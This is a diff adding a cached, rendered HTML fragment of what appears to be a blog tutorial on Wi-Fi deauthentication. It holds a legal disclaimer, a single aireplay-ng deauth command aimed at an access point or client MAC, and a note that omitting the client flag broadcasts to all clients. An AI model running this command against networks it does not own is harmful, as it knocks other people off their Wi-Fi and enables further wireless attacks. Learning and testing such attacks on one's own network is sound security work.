@@ -1,0 +1,13 @@
+I"Ä<blockquote>
+  <p><strong>Disclaimer</strong>: This might be illegal in some countries. Perform this attack on your own network only!</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aireplay-ng <span class="nt">-0</span> 1 <span class="nt">-a</span> &lt;<span class="nv">$AP_MAC</span><span class="o">&gt;</span> <span class="o">[</span><span class="nt">-c</span> &lt;<span class="nv">$CLIENT_MAC</span><span class="o">&gt;]</span> wlan0
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: If <code class="highlighter-rouge">-c</code> ist not set, the deauth request is broadcasted to all clients!</p>
+</blockquote>
+
+<hr />
+:ET
